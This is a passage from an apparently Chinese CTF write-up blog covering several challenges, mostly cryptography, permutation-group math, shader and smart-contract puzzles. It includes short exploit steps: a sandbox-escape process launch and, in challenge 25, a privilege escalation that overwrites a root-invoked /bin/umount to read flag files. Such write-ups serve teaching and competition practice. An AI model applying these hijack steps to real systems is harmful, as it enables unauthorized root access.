+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="flag2">flag2</h4>
+<p>不知道为什么我的电脑上可以，评测机上 <code>execve</code> 不行，<code>execveat</code> 也不行，而 <code>execveat</code> 的汇编也存在 <code>Permission</code> 方面的问题</p>
+<p>后来尝试用 windows 的 API，把 start.exe 附到代码里，但是评测机上的 start.exe 没有打印输出结果的选项</p>
+<p>最后发现用 windows 直接创建进程运行这个文件是可以的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">executeFile</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcess</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">?</span><span class="se">\\</span><span class="s">unix</span><span class="se">\\</span><span class="s">readflag&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateProcess failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;argv[%i]: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">executeFile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="15-蒙特卡罗轮盘赌">15 蒙特卡罗轮盘赌</h3>
+<p>随机数种子取决于 <code>time(0) + clock()</code>。其中 <code>clock()</code> 表示程序运行的 CPU 时钟数，本地运行大概在 500-1500 之间。</p>
+<p>一开始假设其为某个值和服务器枚举，结果试了 1000 次都不行。</p>
+<p>后来想到可以先随便输两个数字，把前两题的答案套出来，然后再枚举。</p>
+<p>代码见 <a href="15/solve.c">solve.c</a></p>
+<br>
+<h3 id="17-惜字如金">17 惜字如金</h3>
+<h4 id="hs384">HS384</h4>
+<p>手动还原一些字符</p>
+<p>密钥部分写个扩写程序，暴力枚举，求出密钥的 LCS 与目标匹配度最高的字符串</p>
+<p>注意原来的字符串后面有些地方可以省略 <code>e</code></p>
+<p>代码见 <a href="17/solve-HS384.py">solve-HS384.py</a></p>
+<blockquote>
+<p>做第二问 RS384 时忘记 a e i o u 不做处理的了</p>
+</blockquote>
+<br>
+<h3 id="18-不可加密的异世界">18 不可加密的异世界</h3>
+<h4 id="疏忽的神">疏忽的神</h4>
+<p>这题要求输入 <code>name</code> <code>IV</code> <code>key</code> 加密算法 分组模式，使得 <code>pass = name + &quot;Open the door!&quot;</code> 加密后的结果为其自身。</p>
+<p>学习了一下块加密的算法、填充方式等信息</p>
+<p>加密算法选择 AES，因为明文长度小于 16 字节，可以塞进 AES 的一个块里</p>
+<p>这题选择 CBC，使用字节反转攻击</p>
+<p>CBC 的公式是</p>
+<p>$$
+C_1 = E(K, P_1 \oplus IV) \
+$$</p>
+<p>即</p>
+<p>$$
+IV = P_1 \oplus D(K, C_1) \
+$$</p>
+<p>$C_1 = P_1 = pass$，K 可以随意设置，利用上述公式可以求出 IV</p>
+<p>代码见 <a href="18/1.py">1.py</a></p>
+<h4 id="心软的神">心软的神</h4>
+<p>这题给定一个字符串，可以选择 加密算法 分组模式，每次可以输入不同的 <code>key</code> <code>IV</code>，要求每次的块的加密结果为其自身。</p>
+<p>这题还是选 CBC</p>
+<p>$$
+C_1 = E(K, P_1 \oplus IV) \
+C_{n+1} = E(K, P_{n+1} \oplus C_n) \
+$$</p>
+<p>即</p>
+<p>$$
+C_n = P_{n+1} \oplus D(K, C_{n+1}) \
+IV = P_1 \oplus D(K, C_1) \
+$$</p>
+<p>$P_n = C_n$，为给定字符串的一个块，K 可以随意设置，利用上述公式可以求出各个 IV</p>
+<p>代码见 <a href="18/2.py">2.py</a></p>
+<blockquote>
+<p>第三问推出 CBC 的公式了，但没想到逆 CRC128，以为是碰撞</p>
+</blockquote>
+<br>
+<h3 id="19-置换魔群">19 置换魔群</h3>
+<h4 id="置换群上的-rsa">置换群上的 RSA</h4>
+<p>secret 和 public 的 tuple 数估计是相等的</p>
+<p>$$
+public ^ {public.order()} = 1 \
+secret ^ e = public
+$$</p>
+<p>所以求出 e 对于 <code>public.order()</code> 的逆元 d</p>
+<p>$$
+public ^ d = secret
+$$</p>
+<p>代码见 <a href="19/RSA.py">RSA.py</a></p>
+<h4 id="置换群上的-dh">置换群上的 DH</h4>
+<p>观察以下群 1-7 次方的变化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span>      <span class="n">raw</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span> <span class="p">(</span><span class="n">raw</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">7</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span> <span class="p">(</span><span class="n">raw</span><span class="o">**</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">9</span><span class="p">),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,),</span> <span class="p">(</span><span class="mi">7</span><span class="p">,),</span> <span class="p">(</span><span class="mi">10</span><span class="p">,)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span> <span class="p">(</span><span class="n">raw</span><span class="o">**</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span> <span class="p">(</span><span class="n">raw</span><span class="o">**</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">7</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span> <span class="p">(</span><span class="n">raw</span><span class="o">**</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,),</span> <span class="p">(</span><span class="mi">5</span><span class="p">,),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,),</span> <span class="p">(</span><span class="mi">7</span><span class="p">,),</span> <span class="p">(</span><span class="mi">8</span><span class="p">,),</span> <span class="p">(</span><span class="mi">9</span><span class="p">,),</span> <span class="p">(</span><span class="mi">10</span><span class="p">,)]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="o">|</span> <span class="p">(</span><span class="n">raw</span><span class="o">**</span><span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="n">standard_tuple</span><span class="p">:</span> <span class="p">[(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,),</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">)]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果知道 raw 和 raw^n，可以根据 raw^n 的每个 tuple 中第一个和第二个元素在 raw 中的位置差，列出同余方程组，然后用中国剩余定理求解</p>
+<p>代码见 <a href="19/DH.py">DH.py</a></p>
+<h4 id="置换群上的超大离散对数">置换群上的超大离散对数</h4>
+<p>这题允许自己选择两个群，然后对方算出它们的 key 次方。</p>
+<p>最好使两个群中所有 tuple 的 lcm 尽可能大。</p>
+<ul>
+<li>首先想到的尽可能多塞素数，计算和不超过 2n 的前几个素数，按照从大到小的顺序生成 tuple 塞进两个群中</li>
+<li>此外，一些素数的次方数也是可行的，例如 25,27,32</li>
+</ul>
+<p>不过由于只是按照贪心算法，在大多数时候并不能得到足够大的解。所以将以下函数更改参数了共计 36 次计算，然后取最大值。人品好就能过 15 关</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">selectPrimesGen</span><span class="p">(</span><span class="n">primeList</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="kc">True</span><span class="p">,</span> <span class="p">[</span><span class="mi">64</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">25</span><span class="p">]),</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>这好像就是背包问题的变种，当时没想</p>
+</blockquote>
+<p>代码见 <a href="19/DH+.py">DH+.py</a></p>
+<br>
+<h3 id="20-光与影">20 光与影</h3>
+<p>一开始以为改代码以后网页显示不出来是因为程序限制了 Hash，后来发现仅仅是还没编译出来而已</p>
+<p>发现 fragment-shader.js 的 t1SDF 里有很多点</p>
+<p>在脑袋里模拟了一下，第一个字母的上面部分有点像 <code>f</code>
+Python 画了一下，发现 <code>t1SDF</code> 里的点是 <code>flag</code></p>
+<p>但其他几个函数里的点似乎都是经过变换的，不可能用 Python 再画一遍。</p>
+<p>看 <code>t5SDF</code> 比较短，可能是用来遮挡 flag 的，把和它相关的删掉即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="kt">float</span> <span class="nf">sceneSDF</span><span class="p">(</span><span class="n">vec3</span> <span class="n">p</span><span class="p">,</span> <span class="n">out</span> <span class="n">vec3</span> <span class="n">pColor</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pColor</span> <span class="o">=</span> <span class="n">vec3</span><span class="p">(</span><span class="mf">1.0</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vec4</span> <span class="n">pH</span> <span class="o">=</span> <span class="n">mk_homo</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vec4</span> <span class="n">pTO</span> <span class="o">=</span> <span class="n">mk_trans</span><span class="p">(</span><span class="mf">35.0</span><span class="p">,</span> <span class="o">-</span><span class="mf">5.0</span><span class="p">,</span> <span class="o">-</span><span class="mf">20.0</span><span class="p">)</span> <span class="o">*</span> <span class="n">mk_scale</span><span class="p">(</span><span class="mf">1.5</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">,</span> <span class="mf">1.0</span><span class="p">)</span> <span class="o">*</span> <span class="n">pH</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">t1</span> <span class="o">=</span> <span class="n">t1SDF</span><span class="p">(</span><span class="n">pTO</span><span class="p">.</span><span class="n">xyz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">t2</span> <span class="o">=</span> <span class="n">t2SDF</span><span class="p">((</span><span class="n">mk_trans</span><span class="p">(</span><span class="o">-</span><span class="mf">45.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">)</span> <span class="o">*</span> <span class="n">pTO</span><span class="p">).</span><span class="n">xyz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">t3</span> <span class="o">=</span> <span class="n">t3SDF</span><span class="p">((</span><span class="n">mk_trans</span><span class="p">(</span><span class="o">-</span><span class="mf">80.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">)</span> <span class="o">*</span> <span class="n">pTO</span><span class="p">).</span><span class="n">xyz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">t4</span> <span class="o">=</span> <span class="n">t4SDF</span><span class="p">((</span><span class="n">mk_trans</span><span class="p">(</span><span class="o">-</span><span class="mf">106.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">)</span> <span class="o">*</span> <span class="n">pTO</span><span class="p">).</span><span class="n">xyz</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// float t5 = t5SDF(p - vec3(36.0, 10.0, 15.0), vec3(30.0, 5.0, 5.0), 2.0);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="kt">float</span> <span class="n">tmin</span> <span class="o">=</span> <span class="n">min</span><span class="p">(</span><span class="n">min</span><span class="p">(</span><span class="n">min</span><span class="p">(</span><span class="n">t1</span><span class="p">,</span> <span class="n">t2</span><span class="p">),</span> <span class="n">t3</span><span class="p">),</span> <span class="n">t4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">tmin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="23-链上记忆大师">23 链上记忆大师</h3>
+<h4 id="记忆练习">记忆练习</h4>
+<p>配置一下 solidity，然后“照猫画虎”</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">MemoryMaster</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">memorize</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">nn</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="n">nn</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">recall</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>后两问没想到能够使用 <code>gas</code> 传递信息</p>
+<p>在想第三问能不能通过 view 函数调用 library function（<code>contract</code> 外的函数）来改变状态，<a href="https://docs.soliditylang.org/en/latest/contracts.html#view-functions">Solidity 文档</a> 里说 <code>library function</code> 没有 view 的运行时检查</p>
+</blockquote>
+<br>
+<h3 id="24-片上系统">24 片上系统</h3>
+<h4 id="引导扇区">引导扇区</h4>
+<p>metadata 里提到了 Sigrok。首先，安装 Sigrok 和 PulseView。</p>
+<p>参考 <a href="https://www.youtube.com/watch?v=z8Tdz7eQ8n4">Getting Started with a $10 Logic Analyzer using Sigrok and PulseView</a> 学习使用，尝试采样并保存</p>
+<p>将保存的 sr 文件中的三个文件替换为给定的文件，重新用 PulseView 打开。</p>
+<p>添加 SPI 解码器，设置变化最频繁的信号为 CLK，最不频繁的信号为 CS，其他两个随意。然后导出 txt，某个信号的最后一行 ASCII 解码后就是 flag</p>
+<blockquote>
+<p>第二问：
+没配好 RISC-V 的反汇编环境。看到 <code>Video outputed</code> 以为前面的代码已经把字符输出到屏幕上了。</p>
+</blockquote>
+<br>
+<h3 id="25-传达不到的文件">25 传达不到的文件</h3>
+<p><code>ps</code> 发现父进程是 <code>/etc/init.d/rcS</code>，这个文件设置了权限，它的最后几行是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">setsid /bin/cttyhack setuidgid <span class="m">1000</span> /bin/sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /tmp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>这道题之后是在手机上做的，手机上真难打命令</p>
+</blockquote>
+<p>去查了一下恰好看到 <a href="https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-others/#poweroff_cmd">change-others</a>，其中提到可以劫持 <code>root</code> 程序将要运行的 <code>poweroff</code> 命令。</p>
+<p>查看文件 <code>ls -l /sbin</code>，发现竟然都是 <code>rwx</code>，<code>/bin</code> 下也是。经过一系列命令的组合，通过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;#!/bin/sh&#34;</span> &gt; /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;cat /flag2&#34;</span> &gt;&gt; /bin/umount
+</span></span><span class="line"><span class="cl">chmod +x /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就可以拿到第二个 Flag。</p>
+<p>而第一个 Flag 是同样的道理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;#!/bin/sh&#34;</span> &gt; /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;cat /chall&#34;</span> &gt;&gt; /bin/umount
+</span></span><span class="line"><span class="cl">chmod +x /bin/umount
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="26-看不见的彼方">26 看不见的彼方</h3>
+<p><code>seccomp</code> 限制了网络的使用</p>
+<p>创建管道似乎需要能访问相同路径的文件，行不通。</p>
+<p>找了个共享内存的代码 <a href="https://zhuanlan.zhihu.com/p/37808566">进程间的通信方式（一）：共享内存</a>。但是由于不能访问相同目录，把 <code>ftok</code> 改成特定值即可（百度百科偶尔还是有用处的）</p>
+<blockquote>
+<p>完整代码见 <a href="26/alice.c">alice.c</a> 和 <a href="26/bob.c">bob.c</a></p>
+</blockquote>
+<blockquote>
+<p>如果上传提示 glibc 版本不兼容，在编译时加上 <code>-static</code></p>
+</blockquote>
+<br>
+<h3 id="27-量子藏宝图">27 量子藏宝图</h3>
+<blockquote>
+<p>我看到数学公式就犯困</p>
+</blockquote>
+<p>第一问，找到一份代码，改改运行</p>
+<p>第二问，也找一份代码，把元件都标上，运行</p>
+<blockquote>
+<p>代码见 <a href="27/qkd.py">qkd.py</a> 和 <a href="27/BernsteinVaziraniAlgorithmSimple.ipynb">BernsteinVaziraniAlgorithmSimple.ipynb</a>，
+分别参考了 <a href="https://github.com/videlanicolas/QKD">videlanicolas/QKD</a> 和 <a href="https://github.com/atilsamancioglu/QX05-BernsteinVaziraniAlgorithmSimple/">atilsamancioglu/QX05-BernsteinVaziraniAlgorithmSimple</a></p>
+</blockquote>
+<br>
+<h3 id="28-关于-robogame-的轮子永远调不准速度这件事">28 《关于 RoboGame 的轮子永远调不准速度这件事》</h3>
+<p>原来以为是要找漏洞。后来发现 <code>r T</code> 可以读数据</p>
+<p>写个脚本把 EEPROM 的程序全读出来</p>
+<p>一开始想把随机数的值改掉，结果没有作用</p>
+<p>后来想把 + 9 改掉。结果把 3 号页的 9 抹掉以后，发现程序开始以奇怪的方式跑起来了，经过一段时间的观察，发现此时这个程序会按顺序分别将两边的数字设置为 1,0,1,2,0,0,0，而这道题目只需要出现连续 3 次相同的数字就可以过了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">w T 65 3 0 9 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+</span></span><span class="line"><span class="cl">w 1 1 1     # 两边写 1
+</span></span><span class="line"><span class="cl">w 1 1 1     # 两边写 0
+</span></span><span class="line"><span class="cl">w 7 1 0     # 两边写 1    7 为 0
+</span></span><span class="line"><span class="cl">w 1 1 1     # 两边写 2
+</span></span><span class="line"><span class="cl">w 9 1 0     # 两边写 0    8 9 0 为 0
